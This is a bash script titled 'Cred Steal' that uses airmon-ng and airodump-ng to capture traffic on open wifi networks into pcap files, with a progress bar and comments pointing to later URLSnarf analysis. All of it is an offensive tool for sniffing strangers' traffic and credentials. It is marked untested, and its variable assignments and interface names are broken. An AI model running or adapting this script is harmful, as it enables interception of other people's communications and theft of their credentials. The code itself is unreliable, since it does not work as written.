 #!/bin/bash
#===Current version not tested===

#This will open airodump-ng to grab traffic on open networks. This will also boot into analysis for the data using URLSnarf. 

#Spalsh screen
#Font: Big (with modifcation) http://patorjk.com/software/taag/#p=display&f=Big&t=Cred%20Steal
echo "   _____              _    _____ _             _ "
echo "  / ____|            | |  / ____| |           | |"
echo " | |     _ __ ___  __| | | (___ | |_ ___  __ _| |"
echo " | |    | '__/ _ \/ _' |  \ __ \| _ / _ \/ _' | |"
echo " | |____| | |  __/ (_| |  ____) | ||  __/ (_| | |"
echo "  \_____|_|  \___|\__,_| |_____/ \__\___|\__,_|_|"
echo "Written by fox3455"
sleep 3

#date var
USER="whoami"								 #This pulls the current active user
DATE="date [[mm][dd]]"  					 #This pulls current date
FILE="/home/$USER/Documents/pcap/dump_$DATE" #This is where the pcap data will be stored. Change filepath if you want to store data elsewhere.
DIRECTORY="/home/$USER/Documents/pcap"		 #This is the filepath for the pcap data. Edit if you want to direct elsewhere.

#Starting autopwn
if [ ! -d "$DIRECTORY" ]; then				 #This IF statemnet will check if you already have a pcap folder.
  mkdir $DIRECTORY							 #Creates the directory if it is missing.	
fi
echo "                          (0%)\r"		 #Loading visual
airmon-ng start wlan0mon 					 #Starts wlan0 in monitor mode. Change if your wifi card differs 
echo -n "#####                     (33%)\r"	 #Next loading sequence
airodump-ng -w $FILE wlan0mon				 #Starts the monitoring
echo -n "#############             (66%)\r"  #Next loading sequence
sleep 2m									 #Sleep to allow data capture
echo -n  "#################        (74%)\r"	 #Final loading sequence
sleep 2m									 #Sleep another 2 minutes

echo -n  "#######################   (100%)\r" #Task completed
sleep 2										 #Sleep 2 seconds to display 100% bar
clear										 #Clear terminal
sleep 5										 #Sleep 5 seconds
echo "Job completed. File found in " $FILE   #Display where files are stored
